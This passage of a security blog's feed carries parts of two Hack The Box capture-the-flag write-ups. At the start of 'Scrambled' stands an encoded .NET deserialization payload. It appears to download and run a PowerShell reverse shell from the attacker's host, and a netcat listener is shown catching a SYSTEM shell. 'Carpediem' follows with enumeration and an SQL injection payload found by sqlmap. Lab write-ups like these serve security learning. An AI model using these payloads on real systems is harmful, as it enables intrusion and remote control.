font-style: inherit;">AAEAAAD/////AQAAAAAAAAAEAQAAAClTeXN0ZW0uU2VjdXJpdHkuUHJpbmNpcGFsLldpbmRvd3NJZGVudGl0eQEAAAAkU3lzdGVtLlNlY3VyaXR5LkNsYWltc0lkZW50aXR5LmFjdG9yAQYCAAAAuApBQUVBQUFELy8vLy9BUUFBQUFBQUFBQU1BZ0FBQUY1TmFXTnliM052Wm5RdVVHOTNaWEpUYUdWc2JDNUZaR2wwYjNJc0lGWmxjbk5wYjI0OU15NHdMakF1TUN3Z1EzVnNkSFZ5WlQxdVpYVjBjbUZzTENCUWRXSnNhV05MWlhsVWIydGxiajB6TVdKbU16ZzFObUZrTXpZMFpUTTFCUUVBQUFCQ1RXbGpjbTl6YjJaMExsWnBjM1ZoYkZOMGRXUnBieTVVWlhoMExrWnZjbTFoZEhScGJtY3VWR1Y0ZEVadmNtMWhkSFJwYm1kU2RXNVFjbTl3WlhKMGFXVnpBUUFBQUE5R2IzSmxaM0p2ZFc1a1FuSjFjMmdCQWdBQUFBWURBQUFBaWdZOFAzaHRiQ0IyWlhKemFXOXVQU0l4TGpBaUlHVnVZMjlrYVc1blBTSjFkR1l0TVRZaVB6NE5DanhQWW1wbFkzUkVZWFJoVUhKdmRtbGtaWElnVFdWMGFHOWtUbUZ0WlQwaVUzUmhjblFpSUVselNXNXBkR2xoYkV4dllXUkZibUZpYkdWa1BTSkdZV3h6WlNJZ2VHMXNibk05SW1oMGRIQTZMeTl6WTJobGJXRnpMbTFwWTNKdmMyOW1kQzVqYjIwdmQybHVabmd2TWpBd05pOTRZVzFzTDNCeVpYTmxiblJoZEdsdmJpSWdlRzFzYm5NNmMyUTlJbU5zY2kxdVlXMWxjM0JoWTJVNlUzbHpkR1Z0TGtScFlXZHViM04wYVdOek8yRnpjMlZ0WW14NVBWTjVjM1JsYlNJZ2VHMXNibk02ZUQwaWFIUjBjRG92TDNOamFHVnRZWE11YldsamNtOXpiMlowTG1OdmJTOTNhVzVtZUM4eU1EQTJMM2hoYld3aVBnMEtJQ0E4VDJKcVpXTjBSR0YwWVZCeWIzWnBaR1Z5TGs5aWFtVmpkRWx1YzNSaGJtTmxQZzBLSUNBZ0lEeHpaRHBRY205alpYTnpQZzBLSUNBZ0lDQWdQSE5rT2xCeWIyTmxjM011VTNSaGNuUkpibVp2UGcwS0lDQWdJQ0FnSUNBOGMyUTZVSEp2WTJWemMxTjBZWEowU1c1bWJ5QkJjbWQxYldWdWRITTlJaTlqSUhCdmQyVnljMmhsYkd3Z2FXVjRLRzVsZHkxdlltcGxZM1FnYzNsemRHVnRMbTVsZEM1M1pXSmpiR2xsYm5RcExtUnZkMjVzYjJGa2MzUnlhVzVuS0Nkb2RIUndPaTh2TVRBdU1UQXVNVFF1Tnk5eVpYWXVjSE14SnlraUlGTjBZVzVrWVhKa1JYSnliM0pGYm1OdlpHbHVaejBpZTNnNlRuVnNiSDBpSUZOMFlXNWtZWEprVDNWMGNIVjBSVzVqYjJScGJtYzlJbnQ0T2s1MWJHeDlJaUJWYzJWeVRtRnRaVDBpSWlCUVlYTnpkMjl5WkQwaWUzZzZUblZzYkgwaUlFUnZiV0ZwYmowaUlpQk1iMkZrVlhObGNsQnliMlpwYkdVOUlrWmhiSE5sSWlCR2FXeGxUbUZ0WlQwaVkyMWtJaUF2UGcwS0lDQWdJQ0FnUEM5elpEcFFjbTlqWlhOekxsTjBZWEowU1c1bWJ6NE5DaUFnSUNBOEwzTmtPbEJ5YjJObGMzTStEUW9nSUR3dlQySnFaV04wUkdGMFlWQnliM1pwWkdWeUxrOWlhbVZqZEVsdWMzUmhibU5sUGcwS1BDOVBZbXBsWTNSRVlYUmhVSEp2ZG1sa1pYSStDdz09Cw==</span></span></code></pre></div>
<div class="sourceCode" id="cb43" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb43-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  scrambled python3 <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-m</span> http.server 80</span>
<span id="cb43-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Serving</span> HTTP on 0.0.0.0 port 80 <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">http://0.0.0.0:80/</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">...</span></span>
<span id="cb43-3"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">10.10.11.168</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-</span> [16/Sep/2022 10:34:20] <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"GET /rev.ps1 HTTP/1.1"</span> 200 <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-</span></span>
<span id="cb43-4"></span>
<span id="cb43-5"></span>
<span id="cb43-6"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  scrambled nc <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-lvnp</span> 4488</span>
<span id="cb43-7"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">listening</span> on <span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">[</span><span class="ss" style="color: #20794D;
background-color: null;
font-style: inherit;">any</span><span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">]</span> 4488 ...</span>
<span id="cb43-8"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">connect</span> to <span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">[</span><span class="ss" style="color: #20794D;
background-color: null;
font-style: inherit;">10.10.14.7</span><span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">]</span> from <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">UNKNOWN</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[10.10.11.168]</span> 65465</span>
<span id="cb43-9"></span>
<span id="cb43-10"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">PS</span> C:<span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\W</span>indows<span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\s</span>ystem32<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> whoami</span>
<span id="cb43-11"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">nt</span> authority<span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\s</span>ystem</span>
<span id="cb43-12"></span>
<span id="cb43-13"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">PS</span> C:<span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\U</span>sers<span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\a</span>dministrator<span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\D</span>esktop<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> type root.txt</span>
<span id="cb43-14"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">c9ff456340b7b2feedb093d15b59f167</span></span></code></pre></div>
<p>Report <code>root.txt</code> and I’m <strong>rank 1</strong> in Sweden!</p>
<p><img src="https://exploit.se/posts/2022-09-16-htb-writeup-scrambled/images/nr1.png" class="img-fluid"></p>


</section>
</section>

 ]]></description>
  <category>hackthebox</category>
  <category>windows</category>
  <category>TGT</category>
  <category>kerberoast</category>
  <category>silver ticket</category>
  <category>pivot</category>
  <category>ysoserial</category>
  <guid>https://exploit.se/posts/2022-09-16-htb-writeup-scrambled/2022-09-16-htb-writeup-scrambled.html</guid>
  <pubDate>Fri, 16 Sep 2022 00:00:00 GMT</pubDate>
  <media:content url="https://exploit.se/posts/2022-09-16-htb-writeup-scrambled/images/scrambled_logo.png" medium="image" type="image/png" height="144" width="144"/>
</item>
<item>
  <title>Carpediem - Hack The Box</title>
  <dc:creator>0xPThree </dc:creator>
  <link>https://exploit.se/posts/2022-09-14-htb-writeup-carpediem/2022-09-14-htb-writeup-carpediem.html</link>
  <description><![CDATA[ 





<section id="user" class="level1">
<h1>USER</h1>
<section id="step-1---poking-around-on-port-80" class="level3">
<h3 class="anchored" data-anchor-id="step-1---poking-around-on-port-80">Step 1 - Poking around on port 80</h3>
<div class="sourceCode" id="cb1" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb1-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  carpediem nmap <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-Pn</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-n</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-p-</span> 10.10.11.167</span>
<span id="cb1-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">PORT</span>   STATE SERVICE</span>
<span id="cb1-3"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">22/tcp</span> open  ssh</span>
<span id="cb1-4"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">80/tcp</span> open  http</span>
<span id="cb1-5"></span>
<span id="cb1-6"></span>
<span id="cb1-7"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  carpediem nmap <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-Pn</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-n</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-p22,80</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-sCV</span> 10.10.11.167</span>
<span id="cb1-8"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">PORT</span>   STATE SERVICE VERSION</span>
<span id="cb1-9"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">22/tcp</span> open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Ubuntu</span> Linux<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">protocol</span> 2.0<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb1-10"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">ssh-hostkey:</span> </span>
<span id="cb1-11"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span>   <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">3072</span> 96:21:76:f7:2d:c5:f0:4e:e0:a8:df:b4:d9:5e:45:26 <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">RSA</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb1-12"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span>   <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">256</span> b1:6d:e3:fa:da:10:b9:7b:9e:57:53:5c:5b:b7:60:06 <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">ECDSA</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb1-13"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">_</span>  256 6a:16:96:d8:05:29:d5:90:bf:6b:2a:09:32:dc:36:4f <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">ED25519</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb1-14"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">80/tcp</span> open  http    nginx 1.18.0 <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Ubuntu</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb1-15"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">_http-server-header:</span> nginx/1.18.0 <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Ubuntu</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb1-16"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">_http-title:</span> Comming Soon</span>
<span id="cb1-17"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Service</span> Info: OS: Linux<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">CPE:</span> cpe:/o:linux:linux_kernel</span></code></pre></div>
<div class="sourceCode" id="cb2" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb2-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  webanalyze ./webanalyze <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-host</span> http://10.10.11.167</span>
<span id="cb2-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">http://10.10.11.167</span> <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">0.2s</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span><span class="bu" style="color: null;
background-color: null;
font-style: inherit;">:</span></span>
<span id="cb2-3">    <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Bootstrap,</span>  <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">UI</span> frameworks<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb2-4">    <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Google</span> Font API,  <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Font</span> scripts<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb2-5">    <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Ubuntu,</span>  <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Operating</span> systems<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb2-6">    <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Nginx,</span> 1.18.0 <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Web</span> servers, Reverse proxies<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span></code></pre></div>
<p>Visiting <code>http://10.10.11.167</code> we find the domain <code>carpediem.htb</code> and a release count down, similar to the box <em>Player</em>. <img src="https://exploit.se/posts/2022-09-14-htb-writeup-carpediem/images/carpediem01.png" class="img-fluid"></p>
<p>Looking for vhosts we find <code>portal.carpediem.htb</code>:</p>
<div class="sourceCode" id="cb3" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb3-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  carpediem ffuf <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-c</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-w</span> /usr/share/wordlists/dirb/big.txt <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-u</span> http://carpediem.htb <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-H</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"Host: FUZZ.carpediem.htb"</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-fs</span> 2875</span>
<span id="cb3-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">portal</span>                  [Status: 200, Size: 31090, Words: 7687, Lines: 463, Duration: 104ms]</span></code></pre></div>
<p><code>http://portal.carpediem.htb</code> is a unexpected motorcycle shop. <img src="https://exploit.se/posts/2022-09-14-htb-writeup-carpediem/images/carpediem02.png" class="img-fluid"></p>
<p>Looking around on the <code>portal</code> page we have a lot of parameters to fuzz, starting with <code>search</code> I find nothing. Next moving on to <code>?p=</code> I’m able to create a loop which will exhaust the memory revealing the directory location: <img src="https://exploit.se/posts/2022-09-14-htb-writeup-carpediem/images/carpediem03.png" class="img-fluid"></p>
<p>Testing any other of the found parameters, example <code>uploads</code>, we get this message:</p>
<div class="sourceCode" id="cb4" style="background: #f1f3f5;"><pre class="sourceCode php code-with-copy"><code class="sourceCode php"><span id="cb4-1">Warning<span class="ot" style="color: #003B4F;
background-color: null;
font-style: inherit;">:</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">include</span>(uploads<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">/</span>index<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span>php)<span class="ot" style="color: #003B4F;
background-color: null;
font-style: inherit;">:</span> failed to open stream<span class="ot" style="color: #003B4F;
background-color: null;
font-style: inherit;">:</span> No such <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">file</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">or</span> <span class="bu" style="color: null;
background-color: null;
font-style: inherit;">directory</span> in <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">/</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">var</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">/</span>www<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">/</span>html<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">/</span>portal<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">/</span>index<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span>php on line <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">14</span></span>
<span id="cb4-2"></span>
<span id="cb4-3">Warning<span class="ot" style="color: #003B4F;
background-color: null;
font-style: inherit;">:</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">include</span>()<span class="ot" style="color: #003B4F;
background-color: null;
font-style: inherit;">:</span> Failed opening <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'uploads/index.php'</span> <span class="cf" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">for</span> inclusion (include_path<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'.:/usr/local/lib/php'</span>) in <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">/</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">var</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">/</span>www<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">/</span>html<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">/</span>portal<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">/</span>index<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span>php on line <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">14</span></span></code></pre></div>
<p>I’m unable to do anything of use with this information, so lets move on.</p>
<div class="sourceCode" id="cb5" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb5-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  carpediem ffuf <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-c</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-w</span> /usr/share/wordlists/dirb/big.txt <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-u</span> http://portal.carpediem.htb/FUZZ/</span>
<span id="cb5-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">.htaccess</span>               [Status: 403, Size: 285, Words: 20, Lines: 10, Duration: 71ms]</span>
<span id="cb5-3"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">.htpasswd</span>               [Status: 403, Size: 285, Words: 20, Lines: 10, Duration: 75ms]</span>
<span id="cb5-4"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">admin</span>                   [Status: 200, Size: 27834, Words: 7052, Lines: 567, Duration: 89ms]</span>
<span id="cb5-5"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">assets</span>                  [Status: 403, Size: 285, Words: 20, Lines: 10, Duration: 63ms]</span>
<span id="cb5-6"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">build</span>                   [Status: 403, Size: 285, Words: 20, Lines: 10, Duration: 66ms]</span>
<span id="cb5-7"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">classes</span>                 [Status: 403, Size: 285, Words: 20, Lines: 10, Duration: 55ms]</span>
<span id="cb5-8"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">dist</span>                    [Status: 403, Size: 285, Words: 20, Lines: 10, Duration: 64ms]</span>
<span id="cb5-9"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">icons</span>                   [Status: 403, Size: 285, Words: 20, Lines: 10, Duration: 65ms]</span>
<span id="cb5-10"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">inc</span>                     [Status: 403, Size: 285, Words: 20, Lines: 10, Duration: 65ms]</span>
<span id="cb5-11"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">libs</span>                    [Status: 403, Size: 285, Words: 20, Lines: 10, Duration: 63ms]</span>
<span id="cb5-12"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">plugins</span>                 [Status: 403, Size: 285, Words: 20, Lines: 10, Duration: 41ms]</span>
<span id="cb5-13"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">server-status</span>           [Status: 403, Size: 285, Words: 20, Lines: 10, Duration: 68ms]</span>
<span id="cb5-14"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">uploads</span>                 [Status: 403, Size: 285, Words: 20, Lines: 10, Duration: 63ms]</span></code></pre></div>
<p>Browsing to <code>/admin</code> we get a alert saying <code>Access Denied!</code>, trying to register a user account and testing again result in the same thing.</p>
<p>Playing around with the register function we can confirm that there is a user called <code>admin</code>: <img src="https://exploit.se/posts/2022-09-14-htb-writeup-carpediem/images/carpediem04.png" class="img-fluid"></p>
<p>We’re able to break the SQL syntax by entering username <code>'ORDER BY 1--</code>: <img src="https://exploit.se/posts/2022-09-14-htb-writeup-carpediem/images/carpediem05.png" class="img-fluid"></p>
<p>Save the request to a file and fire up <code>sqlmap</code> to do the heavy lifting for you.</p>
<div class="sourceCode" id="cb6" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb6-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  carpediem sqlmap <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-r</span> register.req <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-p</span> username</span>
<span id="cb6-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[...</span> snip ...]</span>
<span id="cb6-3"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[12:35:21]</span> <span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">[</span><span class="ss" style="color: #20794D;
background-color: null;
font-style: inherit;">INFO</span><span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">]</span> POST parameter <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'username'</span> is <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'MySQL &gt;= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'</span> injectable</span>
<span id="cb6-4"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">sqlmap</span> identified the following injection point<span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">s</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">with</span> a total of 996 HTTP<span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">s</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">requests:</span></span>
<span id="cb6-5"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">---</span></span>
<span id="cb6-6"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Parameter:</span> username <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">POST</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb6-7">    <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Type:</span> error-based</span>
<span id="cb6-8">    <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Title:</span> MySQL <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span>= 5.6 AND error-based <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-</span> WHERE, HAVING, ORDER BY or GROUP BY clause <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">GTID_SUBSET</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb6-9">    <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Payload:</span> firstname=asdf<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">&amp;</span><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">lastname</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span>asdf<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">&amp;</span><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">contact</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span>asdf<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">&amp;</span><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">gender</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span>Male<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">&amp;</span><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">address</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span>asdf<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">&amp;</span><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">username</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span>injectpls<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'||(SELECT 0x62626476 WHERE 4087=4087 AND GTID_SUBSET(CONCAT(0x7178627671,(SELECT (ELT(5583=5583,1))),0x71707a7a71),5583))||'</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">&amp;</span><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">password</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span>asdf</span>
<span id="cb6-10"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">---</span></span>
<span id="cb6-11"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[12:35:35]</span> <span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">[</span><span class="ss" style="color: #20794D;
background-color: null;
font-style: inherit;">INFO</span><span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">]</span> the back-end DBMS is MySQL</span>
<span id="cb6-12"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">web</span> server operating system: Linux Ubuntu</span>
<span id="cb6-13"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">web</span> application technology: PHP 7.4.25, Nginx 1.18.0</span>
<span id="cb6-14"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">back-end</span> DBMS: MySQL <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span>= 5.6</span>
<span id="cb6-15"></span>
<span id="cb6-16"><span class="ex" style="color: null;
background-color: null;
